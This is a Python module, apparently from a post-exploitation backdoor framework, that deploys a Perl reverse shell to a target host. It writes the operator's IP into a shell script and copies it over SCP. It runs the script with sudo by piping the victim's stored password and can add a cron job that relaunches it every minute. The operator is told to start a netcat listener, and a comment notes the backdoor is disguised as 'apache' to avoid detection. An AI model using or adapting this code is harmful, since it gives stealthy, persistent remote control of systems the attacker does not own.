from backdoor import *

class Perl(Backdoor):
    prompt = Fore.RED + "(perl) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core, ip):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Perl module"
        self.target = target
        self.core = core
	self.localIP = ip
        self.options = {
                "port"   : Option("port", 53921, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")
        toW = 'perl/prsA.pl'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("perl/prs1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.localIP

        with open ("perl/prs2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()

	cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
        self.target.scpFiles(self, 'perl/prsA.pl', False)
        print("Moving the backdoor script.")

	if(cron):
	    self.target.ssh.exec_command("crontab -l > mycron")
            str = ("* * * * * echo \\\""+ self.target.pword + "\\\" | sudo -S nohup perl prsA.pl" )
            #print ("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
            self.target.ssh.exec_command("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron") 
        #do it in either case to start the backdoor.
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup perl prsA.pl")
        
	print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop, unless it is a cronjob." % port)








